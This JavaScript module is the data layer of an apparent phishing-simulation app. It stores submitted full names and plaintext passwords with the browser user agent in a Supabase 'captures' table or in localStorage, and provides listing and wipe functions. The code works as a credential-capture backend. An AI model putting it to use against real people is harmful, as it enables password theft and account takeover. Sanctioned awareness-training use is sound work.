// ------------------------------------------------------------------
// Data layer.
//
// If VITE_SUPABASE_URL + VITE_SUPABASE_ANON_KEY are set, submissions go
// to a shared Supabase (cloud) database. Otherwise we fall back to the
// browser's localStorage so the app works instantly with no setup.
//
// Same API either way: saveCapture / getCaptures / clearCaptures.
// ------------------------------------------------------------------
import { createClient } from '@supabase/supabase-js'

const url = import.meta.env.VITE_SUPABASE_URL
const key = import.meta.env.VITE_SUPABASE_ANON_KEY

export const usingSupabase = Boolean(url && key)

const supabase = usingSupabase ? createClient(url, key) : null

const LOCAL_KEY = 'phishing_sim_captures'

function readLocal() {
  try {
    return JSON.parse(localStorage.getItem(LOCAL_KEY) || '[]')
  } catch {
    return []
  }
}

function writeLocal(rows) {
  try {
    localStorage.setItem(LOCAL_KEY, JSON.stringify(rows))
  } catch {
    /* storage disabled — ignore */
  }
}

export async function saveCapture({ full_name, password }) {
  const row = {
    full_name,
    password,
    user_agent: navigator.userAgent,
    created_at: new Date().toISOString(),
  }

  if (usingSupabase) {
    const { error } = await supabase.from('captures').insert(row)
    if (error) throw error
    return
  }

  const rows = readLocal()
  rows.unshift({ id: crypto.randomUUID(), ...row })
  writeLocal(rows)
}

export async function getCaptures() {
  if (usingSupabase) {
    const { data, error } = await supabase
      .from('captures')
      .select('*')
      .order('created_at', { ascending: false })
    if (error) throw error
    return data || []
  }
  return readLocal()
}

export async function clearCaptures() {
  if (usingSupabase) {
    // delete every row (id is never this sentinel value)
    const { error } = await supabase
      .from('captures')
      .delete()
      .neq('id', '00000000-0000-0000-0000-000000000000')
    if (error) throw error
    return
  }
  writeLocal([])
}
